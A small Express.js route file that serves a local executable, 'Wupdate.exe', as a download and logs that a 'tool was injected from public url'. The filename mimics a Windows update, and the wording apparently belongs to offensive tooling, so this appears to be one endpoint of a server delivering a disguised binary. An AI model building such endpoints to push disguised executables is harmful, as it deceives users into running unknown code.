let router = require('express').Router();
const fs = require("fs");
const path = require("path");
const Utils = require("../../Utils/UtilFunctions/utilFunctions");
const appDir = path.dirname(require.main.filename);


router.route('/').get((req, res) => {
    res.setHeader('Content-disposition', 'attachment; filename=Wupdate.exe');
    res.setHeader('Content-type', 'application/x-msdownload');
    let file = fs.createReadStream(path.resolve(appDir, 'tool', 'Wupdate.exe'));
    file.pipe(res)
    Utils.LogToFile(`[+] Tool was injected from public url`)
})

module.exports = router;